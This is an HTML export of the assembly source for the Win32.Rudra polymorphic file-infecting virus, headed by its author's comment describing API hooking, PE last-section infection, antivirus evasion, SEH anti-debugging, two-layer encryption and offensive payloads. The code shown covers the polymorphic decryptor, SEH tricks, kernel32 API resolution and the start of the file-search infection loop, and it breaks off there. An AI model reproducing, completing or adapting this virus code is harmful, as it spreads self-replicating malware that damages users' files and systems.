<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;                             ฤ&lt; Win32.Rudra &gt;ฤ</span><span class="sc0">
</span><span class="sc1">;                            Designed by LiteSys</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is Rudra, my first polymorphic virus. It's a direct action (with</span><span class="sc0">
</span><span class="sc1">; directory backwards navigation) and a per-process resident virus. Hooks</span><span class="sc0">
</span><span class="sc1">; the following APIs: CreateProcessA, WinExec, CreateFileA, OpenFileA,</span><span class="sc0">
</span><span class="sc1">; CopyFileA, MoveFileA, _lopen.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To say that the poly engine is stupid is an appropiate metaphor, the</span><span class="sc0">
</span><span class="sc1">; reasons are obvious: the decryption opcodes are fixed and in a fixed</span><span class="sc0">
</span><span class="sc1">; position in the decryptor, so it would be very easy to the avers to</span><span class="sc0">
</span><span class="sc1">; detect it using mask. I used two encryption layers (maybe it's a very bad</span><span class="sc0">
</span><span class="sc1">; implemented idea), being the first the polymorphic one.</span><span class="sc0">
</span><span class="sc1">; It's the first poly engine i've written so far, and I didn't have any</span><span class="sc0">
</span><span class="sc1">; other poly code so I think many concepts are still unclear in my mind.</span><span class="sc0">
</span><span class="sc1">; But next will be better, promised.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The infection algorithm is, obviously, last section expanding, I really</span><span class="sc0">
</span><span class="sc1">; don't care about overwriting the .reloc section, albeit it's never used,</span><span class="sc0">
</span><span class="sc1">; I let it alone...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus has multiple payloads. Executed every sabbath, consists in</span><span class="sc0">
</span><span class="sc1">; executing one of the three following payloads:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + Creates some stupid named directories on the root directory with a</span><span class="sc0">
</span><span class="sc1">;   little offensive note in spanish.</span><span class="sc0">
</span><span class="sc1">; + Browses to some Venezuelan XXX sites (I included a lame C:\con\con to</span><span class="sc0">
</span><span class="sc1">;   hang up some idiots).</span><span class="sc0">
</span><span class="sc1">; + Sets the hard disk label with some offensive stuff.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus uses SEH to generate an exception and to trap any possible</span><span class="sc0">
</span><span class="sc1">; exceptions.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Don't ask me why that name, it came from nothing... hehe. Ok, ok, ok,</span><span class="sc0">
</span><span class="sc1">; you get a prize if you guess where did this name came from!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; By the way, this is another shitty virus written by me... don't expect</span><span class="sc0">
</span><span class="sc1">; too much stability or optimization 'cause I don't have time to spend</span><span class="sc0">
</span><span class="sc1">; with it...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; So, in resume, this virus has:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; + Per-Process Residence</span><span class="sc0">
</span><span class="sc1">; + Direct Action Infection with directory backwards navigation</span><span class="sc0">
</span><span class="sc1">; + Last section infection</span><span class="sc0">
</span><span class="sc1">; + Avoids infecting some "suspicious" AV-like files</span><span class="sc0">
</span><span class="sc1">; + SEH for antidebugging purposes</span><span class="sc0">
</span><span class="sc1">; + SEH for stability purposes</span><span class="sc0">
</span><span class="sc1">; + Two layers of encryption, first one is polymorphic</span><span class="sc0">
</span><span class="sc1">; + Simple, lame and weak polymorphism</span><span class="sc0">
</span><span class="sc1">; + Multiple Payloads</span><span class="sc0">
</span><span class="sc1">; + Does other stuff.</span><span class="sc0">
</span><span class="sc1">; + Virus Size: 5392 bytes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; So, I don't have anything else to say about this shit, maybe greets, yeah</span><span class="sc0">
</span><span class="sc1">; greets are gewd and go to: Mindlock, Knight-7, Evul, Gigabyte, Tokugawa,</span><span class="sc0">
</span><span class="sc1">; Maquiavelo, Thorndike and everybody I forgot... hope you forgive me =P.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; LiteSys.</span><span class="sc0">
</span><span class="sc1">; "Patria o Muerte: Venceremos"    (Ernesto "Che" Guevara)</span><span class="sc0">
</span><span class="sc1">; Venezuela, Junio/Julio 2001</span><span class="sc0">
</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">


</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc9">.MODEL</span><span class="sc0"> </span><span class="sc10">FLAT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">STDCALL</span><span class="sc0">
</span><span class="sc5">LOCALS</span><span class="sc0">

</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">TOOLS</span><span class="sc0">\</span><span class="sc5">TASM</span><span class="sc0">\</span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">WIN32API.INC</span><span class="sc0">
</span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc4">:</span><span class="sc0">\</span><span class="sc5">TOOLS</span><span class="sc0">\</span><span class="sc5">TASM</span><span class="sc0">\</span><span class="sc9">INCLUDE</span><span class="sc0">\</span><span class="sc5">WINDOWS.INC</span><span class="sc0">

</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">EXTRN</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.DATA</span><span class="sc0">

 </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Virus</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Termina_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Empieza_Virus</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Decrip</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Empieza_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Rudra</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Total</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Decrip</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Virus</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Layer2</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Termina_Virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Empieza_Layer2</span><span class="sc4">)</span><span class="sc0">

 </span><span class="sc5">APICALL</span><span class="sc0">                </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">APIx</span><span class="sc0">
   </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">][</span><span class="sc5">APIx</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc9">ENDM</span><span class="sc0">

 </span><span class="sc5">OFS</span><span class="sc0">                    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">]&gt;</span><span class="sc0">
 </span><span class="sc5">BY</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">]&gt;</span><span class="sc0">
 </span><span class="sc5">WO</span><span class="sc0">                     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">]&gt;</span><span class="sc0">
 </span><span class="sc5">DWO</span><span class="sc0">                    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">]&gt;</span><span class="sc0">

 </span><span class="sc5">PAGINAS</span><span class="sc0">                </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc2">32h</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc5">KERNEL_9X</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc2">0BFF70000h</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc5">GPA_9X</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc2">0BFF76DACh</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc5">CRLF</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">&gt;</span><span class="sc0">
 </span><span class="sc6">RDTSC</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">DW</span><span class="sc0"> </span><span class="sc2">310Fh</span><span class="sc4">&gt;</span><span class="sc0">

 </span><span class="sc5">SYSTEMTIME</span><span class="sc0">             </span><span class="sc9">STRUC</span><span class="sc0">

 </span><span class="sc5">wYear</span><span class="sc0">                  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc5">wMonth</span><span class="sc0">                 </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc5">wDayOfWeek</span><span class="sc0">             </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc5">wDay</span><span class="sc0">                   </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc5">wHour</span><span class="sc0">                  </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc5">wMinute</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc5">wSecond</span><span class="sc0">                </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
 </span><span class="sc5">wMilliseconds</span><span class="sc0">          </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">

 </span><span class="sc5">SYSTEMTIME</span><span class="sc0">             </span><span class="sc9">ENDS</span><span class="sc0">


 </span><span class="sc5">Titulo</span><span class="sc0">                 </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"-=( Rudra )=-"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
 </span><span class="sc5">Ventana</span><span class="sc0">                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Virus 'Rudra' por LiteSys"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Primera Generacion!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRLF</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc3">"Tama๑o total del virus: "</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Total</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Total</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">0100</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Total</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">0010</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Total</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">0001</span><span class="sc0"> </span><span class="sc9">MOD</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc5">CRLF</span><span class="sc0">
                        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc9">.CODE</span><span class="sc0">

</span><span class="sc5">Rudra</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; los bloques son llenados con la basura del poly</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">
  </span><span class="sc5">Delta</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Delta</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Empieza_Virus</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Virus</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">@KZ</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">27d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
  </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">24d</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@KZ</span><span class="sc0">

  </span><span class="sc5">Empieza_Virus</span><span class="sc0">         </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">NEAR</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Tama</span><span class="sc0">ค</span><span class="sc5">o_Layer2</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Empieza_Layer2</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">@DCL2</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"HO"</span><span class="sc0">
   </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
   </span><span class="sc5">Llave_II</span><span class="sc0">             </span><span class="sc9">DW</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
   </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02d</span><span class="sc0">
  </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">@DCL2</span><span class="sc0">

  </span><span class="sc5">Empieza_Layer2</span><span class="sc0">        </span><span class="sc9">LABEL</span><span class="sc0">   </span><span class="sc10">NEAR</span><span class="sc0">

  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@@1</span><span class="sc0">
   </span><span class="sc9">DB</span><span class="sc0">   </span><span class="sc3">"  [RUDRA]  "</span><span class="sc0">
  </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc6">PUSHAD</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Seh_1</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">POPAD</span><span class="sc0">

  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@SigueCodigo</span><span class="sc0">

  </span><span class="sc5">@Seh_1</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">
  </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">

  </span><span class="sc5">@SigueCodigo</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Seh_2</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@Finale</span><span class="sc0">

  </span><span class="sc5">@Seh_2</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">@Mardito</span><span class="sc0">
  </span><span class="sc5">@Mardito</span><span class="sc4">:</span><span class="sc0">
  </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"HOHO"</span><span class="sc0">
  </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
  </span><span class="sc5">El_EIP</span><span class="sc0">                </span><span class="sc9">DD</span><span class="sc0">      </span><span class="sc2">00001000h</span><span class="sc0">
  </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">@Mardito</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Rudra</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">IBase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Obtener_K32</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Obtener_GPA</span><span class="sc0">

  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">KERNEL32</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">APIs_KERNEL32</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LoadLibraryA</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">Obtener_APIs</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Directorio_Inicial</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
 
  </span><span class="sc5">@Busca_Primero</span><span class="sc4">:</span><span class="sc0">

  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Busqueda</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">OFS</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Archivos</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc5">APICALL</span><span class="sc0"> </span><span class="sc5">FindFirstFileA</span><span class="sc0">
  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">DWO</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
  </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
